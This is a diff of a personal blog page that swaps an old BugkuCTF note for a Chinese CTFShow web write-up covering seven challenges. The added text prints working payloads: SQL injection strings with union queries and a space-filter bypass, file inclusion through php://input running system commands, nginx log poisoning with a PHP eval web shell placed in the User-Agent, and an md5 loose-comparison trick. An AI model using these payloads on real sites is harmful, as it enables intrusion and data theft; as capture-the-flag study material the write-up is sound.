@@ -23,26 +23,25 @@
     var CONFIG = {"hostname":"yq1ng.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="小白你的脑洞呢！！！">
+  <meta name="description" content="本文仅为做题记录，可能不够详细，不懂的命令建议百度查询     web签到题 web2 web3 web4 web5 web6 web7">
 <meta property="og:type" content="article">
-<meta property="og:title" content="BugkuCTF-web-头等舱 writeup">
-<meta property="og:url" content="http://yq1ng.github.io/z_post/BugkuCTF-web-%E5%A4%B4%E7%AD%89%E8%88%B1%20writeup/index.html">
+<meta property="og:title" content="CTF秀WEB-WP（持续更新）">
+<meta property="og:url" content="http://yq1ng.github.io/z_post/CTF%E7%A7%80WEB-WP/index.html">
 <meta property="og:site_name" content="会下雪的晴天">
-<meta property="og:description" content="小白你的脑洞呢！！！">
+<meta property="og:description" content="本文仅为做题记录，可能不够详细，不懂的命令建议百度查询     web签到题 web2 web3 web4 web5 web6 web7">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190706134222359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190706134300261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2019070613433574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2019070613442627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190706134700864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
-<meta property="article:published_time" content="2019-07-06T05:47:34.000Z">
-<meta property="article:modified_time" content="2020-09-30T01:30:07.320Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.08jzott3rx95.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.4rtzgtm95op.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.hm3ykdje0p7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.we8vhqra5r.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.g6wz0avu9kn.png">
+<meta property="article:published_time" content="2020-10-13T09:32:00.000Z">
+<meta property="article:modified_time" content="2020-10-14T13:03:53.516Z">
 <meta property="article:author" content="yq1ng">
-<meta property="article:tag" content="CTF WEB">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190706134222359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.08jzott3rx95.png">
 
-<link rel="canonical" href="http://yq1ng.github.io/z_post/BugkuCTF-web-%E5%A4%B4%E7%AD%89%E8%88%B1%20writeup/">
+<link rel="canonical" href="http://yq1ng.github.io/z_post/CTF%E7%A7%80WEB-WP/">
 
 
 <script id="page-configurations">
@@ -55,7 +54,7 @@
   };
 </script>
 
-  <title>BugkuCTF-web-头等舱 writeup | 会下雪的晴天</title>
+  <title>CTF秀WEB-WP（持续更新） | 会下雪的晴天</title>
   
 
 
@@ -190,7 +189,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yq1ng.github.io/z_post/BugkuCTF-web-%E5%A4%B4%E7%AD%89%E8%88%B1%20writeup/">
+    <link itemprop="mainEntityOfPage" href="http://yq1ng.github.io/z_post/CTF%E7%A7%80WEB-WP/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/xiaoxin.jpg">
@@ -203,7 +202,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          BugkuCTF-web-头等舱 writeup
+          CTF秀WEB-WP（持续更新）
         </h1>
 
         <div class="post-meta">
@@ -213,14 +212,14 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2019-07-06 13:47:34" itemprop="dateCreated datePublished" datetime="2019-07-06T13:47:34+08:00">2019-07-06</time>
+              <time title="创建时间：2020-10-13 17:32:00" itemprop="dateCreated datePublished" datetime="2020-10-13T17:32:00+08:00">2020-10-13</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-30 09:30:07" itemprop="dateModified" datetime="2020-09-30T09:30:07+08:00">2020-09-30</time>
+                <time title="修改时间：2020-10-14 21:03:53" itemprop="dateModified" datetime="2020-10-14T21:03:53+08:00">2020-10-14</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -245,14 +244,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>172</span>
+              <span>2.6k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>4 分钟</span>
             </span>
 
         </div>
@@ -265,13 +264,55 @@
 
       
         <blockquote>
-<p>小白你的脑洞呢！！！</p>
+<p>本文仅为做题记录，可能不够详细，不懂的命令建议百度查询</p>
 </blockquote>
+<!-- TOC -->
+
+<ul>
+<li><a href="#web%E7%AD%BE%E5%88%B0%E9%A2%98">web签到题</a></li>
+<li><a href="#web2">web2</a></li>
+<li><a href="#web3">web3</a></li>
+<li><a href="#web4">web4</a></li>
+<li><a href="#web5">web5</a></li>
+<li><a href="#web6">web6</a></li>
+<li><a href="#web7">web7</a></li>
+</ul>
+<!-- /TOC -->
 <a id="more"></a>
+<h1 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h1><p>没啥说的，源码base64解密</p>
 <hr>
-<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>解题链接：<a target="_blank" rel="noopener" href="http://123.206.87.240:9009/hd.php">http://123.206.87.240:9009/hd.php</a><br><img src="https://img-blog.csdnimg.cn/20190706134222359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>打开链接，什么都没有，真的是什么都没有<br><img src="https://img-blog.csdnimg.cn/20190706134300261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看源代码也是什么也没有<br><img src="https://img-blog.csdnimg.cn/2019070613433574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>那就抓包看看<br><img src="https://img-blog.csdnimg.cn/2019070613442627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>也没有，emm<br>再回去看看题目，头等舱，头等舱，头等舱，响应头？？？！！！<br>放到Repeater里面，Go以下，Response里面已经出来flag了</p>
-<h1 id="得到FLAG"><a href="#得到FLAG" class="headerlink" title="得到FLAG"></a>得到FLAG</h1><p><img src="https://img-blog.csdnimg.cn/20190706134700864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><blockquote>
+<p>简单sql</p>
+</blockquote>
+<p>万能密码登陆，<code>username=admin&#39; or(1)#&amp;password=admin</code>，没啥东西，union联合查询，发现回显在第二个<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.08jzott3rx95.png" alt="union"><br>查表：<code>username=admin&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#&amp;password=admin</code><br>查列：<code>username=admin&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;flag&#39;#&amp;password=admin</code><br>查字段：<code>username=admin&#39; union select 1,group_concat(flag),3 from flag#&amp;password=admin</code><br>以上可以理解为固定用法</p>
+<hr>
+<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><blockquote>
+<p>LFI<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/182280.html">不错的文章</a></p>
+</blockquote>
+<p>给了源码<code>&lt;?php include($_GET[&#39;url&#39;]);?&gt;</code>，这题我用了伪协议，通过<code>php://input</code>来执行命令或者写入木马<br><code>GET：http://6a859db9-97c1-4261-b3c9-5b234c4a9c2b.chall.ctf.show/?url=php://input</code>，<code>POST：&lt;?php system(&#39;ls&#39;);?&gt;</code><br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.4rtzgtm95op.png" alt="ls"><br><code>GET：http://6a859db9-97c1-4261-b3c9-5b234c4a9c2b.chall.ctf.show/?url=php://input</code>，<code>POST：&lt;?php system(&#39;cat ctf_go_go_go&#39;);?&gt;</code><br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.hm3ykdje0p7.png" alt="flag"></p>
+<hr>
+<h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><blockquote>
+<p>nginx日志注入，LFI（local File Include）</p>
+</blockquote>
+<p>这题再用上面的就不行了，应该是php伪协议被ban了，但是还能包含<code>/etc/passwd</code>，抓包可以知道服务器是nginx，其默认日志路径在<code>/var/log/nginx/access.log</code>和<code>/var/log/nginx/error.log</code>，其中access可以包含成功，抓包直接在<code>User-Agent</code>输入一句话木马：<code>&lt;?php @eval($_POST[&#39;yq1ng&#39;]);?&gt;</code>，此请求头用来标识客户端用的什么浏览器进行访问的<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.we8vhqra5r.png" alt="yq1ng"><br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.g6wz0avu9kn.png" alt="AntSword"><br>flag在<code>/var/www/flag.txt</code></p>
+<hr>
+<h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><blockquote>
+<p>md5碰撞<br><code>ctype_alpha()</code> –&gt; 做纯字符检测</p>
+</blockquote>
+<p>开箱送源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">&quot;&quot;</span>;</span><br><span class="line">$v1=$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2=$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($v1) &amp;&amp; <span class="keyword">isset</span>($v2))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!ctype_alpha($v1))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;v1 error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;v2 error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(md5($v1)==md5($v2))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;where is flag?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>介绍一个函数<code>ctype_alpha</code><br>用法：ctype_alpha ( string $text ) : bool<br>用途：做纯字符检测<br>返回值：如果在当前语言环境中 text 里的每个字符都是一个字母，那么就返回TRUE，反之则返回FALSE</p>
+</blockquote>
+<p>可以做md5碰撞，<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_19980431/article/details/83018232">CTF中常见php-MD5()函数漏洞</a><br>payload：<code>?v1=QNKCDZO&amp;v2=240610708</code></p>
+<hr>
+<h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><blockquote>
+<p>空格绕过</p>
+</blockquote>
+<p>与web2不同，本题含waf，先试了万能密码<code>username=admin&#39; or(1)#&amp;password=admin</code>，回显：   sql inject error<br>逐个删除万能密码字符，发现过滤的是空格，这好说，空格一般可以由<code>/**/</code>,<code>回车(%0a)</code>,`,<code>tab</code>绕过，一般我用<code>/**/</code>，注入语句和web2一样，只是把空格替换了<br>爆库：<code>username=admin%27/**/union/**/select/**/1,database(),3#&amp;password=a</code>(回显web2，一样的数据库-.-)<br>爆表：<code>username=admin%27/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()#&amp;password=a</code>(flag,user)<br>爆列：<code>username=admin&#39;/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name=&#39;flag&#39;#&amp;password=a</code>(flag)<br>爆字：<code>username=admin&#39;/**/union/**/select/**/1,group_concat(flag),3/**/from/**/flag#&amp;password=a</code></p>
+<hr>
+<h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><p>随便进一个链接，发现URL可能有LFI，并不是，可能还是注入？单引号没用，试试整形注入，<code>?id=1/**/or(1)</code>，文章全出来了，就是这个了；不过联合查询没用，可以试试ascii，payload：<code>?id=-1/**/or/**/ascii(substr(database(),1,1))=119</code>，有回显说明当前字符为119即’w’，上脚本</p>
+<pre><code class="python"></code></pre>
 
     </div>
 
@@ -307,7 +348,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://yq1ng.github.io/z_post/BugkuCTF-web-%E5%A4%B4%E7%AD%89%E8%88%B1%20writeup/" title="BugkuCTF-web-头等舱 writeup">http://yq1ng.github.io/z_post/BugkuCTF-web-头等舱 writeup/</a>
+    <a href="http://yq1ng.github.io/z_post/CTF%E7%A7%80WEB-WP/" title="CTF秀WEB-WP（持续更新）">http://yq1ng.github.io/z_post/CTF秀WEB-WP/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -317,9 +358,6 @@
 
 
       <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/CTF-WEB/" rel="tag"><i class="fa fa-tag"></i> CTF WEB</a>
-          </div>
 
         
 
@@ -327,12 +365,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/z_post/BugkuCTF-web-web5%20writeup/" rel="prev" title="BugkuCTF-web-web5 writeup">
-      <i class="fa fa-chevron-left"></i> BugkuCTF-web-web5 writeup
+    <a href="/z_post/GYCTF2020%E9%83%A8%E5%88%86WEB/" rel="prev" title="GYCTF2020部分WEB">
+      <i class="fa fa-chevron-left"></i> GYCTF2020部分WEB
     </a></div>
       <div class="post-nav-item">
-    <a href="/z_post/BugkuCTF-web-%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91%20writeup/" rel="next" title="BugkuCTF-web-网站被黑 writeup">
-      BugkuCTF-web-网站被黑 writeup <i class="fa fa-chevron-right"></i>
+    <a href="/z_post/%E4%B8%80%E4%BA%9B%E6%84%9F%E6%82%9F/" rel="next" title="一些感悟">
+      一些感悟 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -392,7 +430,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">2.</span> <span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BE%97%E5%88%B0FLAG"><span class="nav-number">3.</span> <span class="nav-text">得到FLAG</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="nav-number">1.</span> <span class="nav-text">web签到题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web2"><span class="nav-number">2.</span> <span class="nav-text">web2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web3"><span class="nav-number">3.</span> <span class="nav-text">web3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web4"><span class="nav-number">4.</span> <span class="nav-text">web4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web5"><span class="nav-number">5.</span> <span class="nav-text">web5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web6"><span class="nav-number">6.</span> <span class="nav-text">web6</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web7"><span class="nav-number">7.</span> <span class="nav-text">web7</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
